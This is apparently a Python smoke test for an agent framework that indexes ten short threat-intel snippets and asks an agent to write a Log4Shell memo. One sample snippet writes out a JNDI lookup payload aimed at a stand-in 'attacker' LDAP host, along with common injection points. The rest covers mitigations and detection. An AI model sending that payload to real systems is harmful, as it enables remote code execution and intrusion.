#!/usr/bin/env python3
# Copyright 2026 Tulip Labs
# SPDX-License-Identifier: Apache-2.0

"""End-to-end smoke test of tulip.deepagent.create_deepagent(datastores=...).

Stays entirely on tulip primitives:

    OpenAIEmbeddings + QdrantVectorStore + RAGRetriever
        |
        v
    create_deepagent(datastores={"intel": retriever}, max_output_tokens=...)
        |
        v
    agent.run_sync("write a memo on the Log4Shell vulnerability")

Validates:
- `text-embedding-3-small` auto-detects its dimension (no enum entry needed).
- `datastores=` auto-wires a `search_intel` tool + datastore description
  block in the system prompt.
- `max_output_tokens=` lands on the per-completion request.

Run:
    OPENAI_API_KEY=sk-... ANTHROPIC_API_KEY=sk-ant-... \\
    python examples/projects/deep-research/demo_smoke.py
"""

from __future__ import annotations

import asyncio
import os
import sys

from tulip.deepagent import create_deepagent
from tulip.rag import OpenAIEmbeddings, RAGRetriever
from tulip.rag.stores.qdrant import QdrantVectorStore


SAMPLE_DOCS = [
    "CVE-2021-44228 (Log4Shell) is a critical RCE in Apache Log4j 2: a crafted "
    "string in a logged field triggers a JNDI lookup that loads remote code. "
    "CVSS 10.0; affects Log4j 2.0-beta9 through 2.14.1.",
    "Log4Shell is exploited by sending a payload such as ${jndi:ldap://attacker/a} "
    "in any attacker-controlled value that gets logged — User-Agent headers, "
    "form fields, and chat messages are all common injection points.",
    "Mitigation for Log4Shell: upgrade to Log4j 2.17.1+; if you cannot patch, set "
    "log4j2.formatMsgNoLookups=true or remove the JndiLookup class from the "
    "classpath. Egress filtering to block outbound LDAP/RMI reduces exploitability.",
    "MITRE ATT&CK T1190 (Exploit Public-Facing Application) is the initial-access "
    "technique most associated with Log4Shell mass-exploitation campaigns observed "
    "in late 2021.",
    "Indicators of Log4Shell exploitation include outbound LDAP/RMI connections "
    "from JVM processes, unexpected child processes spawned by application servers, "
    "and JNDI lookup strings in web access logs.",
    "Credential-harvesting lures frequently impersonate IT helpdesks, "
    "prompting users to 'verify' passwords on a "
    "lookalike domain registered days before the campaign.",
    "Cobalt Strike beacons commonly communicate over HTTPS with jittered sleep "
    "intervals and domain fronting, making purely volumetric detection unreliable; "
    "JA3/JA3S TLS fingerprinting and named-pipe artifacts are stronger signals.",
    "Ransomware affiliates often gain entry via exposed RDP or unpatched VPN "
    "appliances, escalate with credential dumping (LSASS), move laterally over "
    "SMB, and stage exfiltration before encryption to enable double extortion.",
    "EDR telemetry useful for triage includes process-creation events, parent/child "
    "lineage, signed-binary proxy execution (LOLBins like rundll32, mshta), and "
    "anomalous service installs.",
    "Patch prioritization should weigh CVSS alongside whether an exploit is in CISA "
    "KEV (Known Exploited Vulnerabilities) and whether the asset is internet-facing; "
    "a CVSS 7 on an exposed, actively-exploited service outranks a CVSS 9 internal one.",
]


async def main() -> None:
    print("[1/4] Embeddings: text-embedding-3-small (auto-detected dimension)")
    embedder = OpenAIEmbeddings(model="text-embedding-3-small")

    print("[2/4] QdrantVectorStore in-memory (10 sample threat-intel docs)")
    # Trigger one probe call so we know the dimension before constructing
    # the store.
    probe = await embedder.embed_query("probe")
    store = QdrantVectorStore(location=":memory:", dimension=len(probe.embedding))

    retriever = RAGRetriever(embedder=embedder, store=store)
    await retriever.add_documents(SAMPLE_DOCS)
    print(f"      stored {len(SAMPLE_DOCS)} docs at dim={len(probe.embedding)}")

    print("[3/4] create_deepagent(datastores={...}, max_output_tokens=2048)")
    from tulip.models import get_model

    chat_model = get_model(
        "anthropic:claude-sonnet-4-6",  # reliable tool caller for smoke
    )

    agent = create_deepagent(
        model=chat_model,
        system_prompt=(
            "You are a threat-intel research assistant. When asked about a topic, "
            "search the intel datastore for evidence, then write a concise "
            "memo with bullet-pointed findings. Cite document indices when "
            "they support a claim."
        ),
        tools=[],
        datastores={
            "intel": {
                "retriever": retriever,
                "description": (
                    "CVEs, exploitation techniques (MITRE ATT&CK), malware C2, "
                    "ransomware TTPs, detection telemetry, and patch prioritization"
                ),
                "top_k": 4,
            },
        },
        max_output_tokens=2048,
        max_iterations=8,
        reflexion=False,  # keep the smoke run small
        grounding=False,
    )

    print("[4/4] Running: 'short memo on the Log4Shell vulnerability'\n" + "-" * 70)
    result = agent.run_sync(
        "Write a short memo on the Log4Shell vulnerability. Search the intel "
        "datastore first; cite at least three documents."
    )
    # Tulip AgentResult: print the final answer
    print(getattr(result, "answer", None) or getattr(result, "output", None) or result)
    print("-" * 70)
    print("DONE.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(130)
